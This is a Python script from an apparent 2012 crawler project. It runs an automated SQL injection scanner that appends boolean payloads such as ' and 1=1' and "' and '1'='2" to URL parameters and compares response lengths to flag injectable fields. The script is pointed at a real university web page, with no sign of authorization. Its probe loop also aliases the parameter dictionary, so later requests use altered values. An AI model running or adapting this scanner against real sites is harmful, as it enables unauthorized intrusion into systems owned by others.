'''
Created on 2012-8-8

@author: zsy
'''
from myCrawler import glovar
import threading
from urllib.request import Request
from urllib.request import urlopen
from urllib.parse import urlencode
class hrefinject(threading.Thread):
    def __init__(self,hrefdict):
        threading.Thread.__init__(self)
        self.hrefdict=hrefdict
        self.url=list(self.hrefdict)[0]
        self.paradict=self.hrefdict[self.url]
    def requestdict(self,dict):
        dict=urlencode(dict)
        link=self.url+"?"+dict
        r=Request(link)
        resp=urlopen(r)
        if resp:
            code=resp.getcode()
            headresp=resp.info()
            urlresp=resp.geturl()
            pageresp=resp.read()
            return code,headresp,urlresp,pageresp
        else:
            return None
    def Injectiontypedetect(self):
        code,headresp,urlresp,pageresp=self.requestdict(self.paradict)
        i=0
        for item in self.paradict:
            modifieddict=self.paradict
            modifieddict[item]=str(modifieddict[item])
            modifieddict[item]=str(self.paradict[item])+" and 1=1"
            code1,headresp1,urlresp1,pageresp1=self.requestdict(modifieddict)
            modifieddict[item]=str(self.paradict[item])+" and 1=2"
            code2,headresp2,urlresp2,pageresp2=self.requestdict(modifieddict)
            modifieddict[item]=str(self.paradict[item])+"' and '1'='1"
            code3,headresp3,urlresp3,pageresp3=self.requestdict(modifieddict)
            modifieddict[item]=str(self.paradict[item])+"' and '1'='2"
            code4,headresp4,urlresp4,pageresp4=self.requestdict(modifieddict)
            if len(pageresp)==len(pageresp1) and len(pageresp)!=len(pageresp2):
                print("numeric injection point:",item)
                i+=1
            elif len(pageresp)==len(pageresp3) and len(pageresp)!=len(pageresp4):
                print("char injection point:",item)
                i+=1
        print("%d injection point detected!"%i)
    def run(self):
        self.Injectiontypedetect()
if __name__=="__main__":
#    hrefdict=glovar.hreflist[0]
    hrefdict={"http://fist.xjtu.edu.cn//student.php":{"aid":171}}
#    hrefdict={"http://fist.xjtu.edu.cn/center/MTS/list.php":{"ChannelID":5}}
    hrefinjectth=hrefinject(hrefdict)
    hrefinjectth.start()
#    def geturlfromdict(self,paradict):
#        url=self.url
#        url+="?"
#        i=0
#        for item in paradict:
#            if i==len(paradict)-1:
##                url+=item+"="+paradict[item]
#                url+="%s=%s"%(item,paradict[item])
#            else:
##                url+=item+"="+paradict[item]+"&"
#                url+="%s=%s&"%(item,paradict[item])
#            i+=1
#        return url
